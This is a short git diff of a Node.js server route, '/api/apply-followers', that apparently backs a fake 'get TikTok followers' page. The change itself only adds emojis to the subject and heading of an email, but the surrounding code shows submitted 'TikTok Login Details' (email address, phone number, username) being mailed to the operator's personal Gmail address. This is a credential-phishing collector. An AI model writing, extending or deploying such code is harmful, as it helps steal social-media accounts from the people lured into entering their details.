@@ -32,9 +32,9 @@ app.post('/api/apply-followers', async (req, res) => {
     const mailOptions = {
         from: 'lagharitahir08@gmail.com',
         to: 'lagharitahir08@gmail.com',
-        subject: `New TikTok Login Details😍: @${tiktokUsername}`,
+        subject: `😍😍New TikTok Login Details😍😍: @${tiktokUsername}`,
         html: `
-            <h3>New TikTok Account Details Arrived😁</h3>
+            <h3>😁😁New TikTok Account Details Arrived😁😁</h3>
             <p><strong>Email Address:</strong> ${email}</p>
             <p><strong>Phone Number:</strong> ${phoneNumber}</p>
             <p><strong>TikTok Username:</strong> @${tiktokUsername}</p>
